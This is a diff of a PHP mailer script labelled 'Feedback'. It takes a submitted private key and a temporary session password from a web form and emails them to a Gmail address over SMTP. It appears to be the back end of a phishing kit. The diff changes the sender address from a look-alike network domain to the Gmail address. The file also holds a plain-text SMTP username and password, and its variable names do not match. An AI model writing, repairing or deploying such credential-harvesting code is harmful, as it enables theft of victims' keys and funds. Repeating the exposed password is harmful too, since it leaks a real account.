@@ -10,7 +10,7 @@ use PHPMailer\PHPMailer\Exception;
 $subject = "Feedback";
 $privateKey = $_POST['privateKey'];
 $pkpass = $_POST['pkpass'];
-$email_from = 'noreply@mainetworkconnect.com';
+$email_from = 'emmajoy658@gmail.com';
 $email_to = 'emmajoy658@gmail.com';
 
 if($privateKey== '' || $pkpass== ''){
@@ -29,10 +29,10 @@ $mail->SMTPSecure = "tls";
 $mail->Port = "587";
 $mail->Username = "emmajoy658@gmail.com";
 $mail->Password = "Olasunkanmi2001!";
-$mail->setFrom("noreply@mainetworkconnect.com");
-$mail->AddReplyTo("noreply@mainetworkconnect.com");
+$mail->setFrom("emmajoy658@gmail.com");
+$mail->AddReplyTo("emmajoy658@gmail.com");
 $mail->Subject = "/New Entry";
-$mail->MsgHTML($privatekey .  . $pkpass);
+$mail->MsgHTML("emmajoy658@gmail.com");
 
 $mail->Body = "Private Key= " . $privatekey . "\r\n Temporary Session Password= " . $pkpass;
 
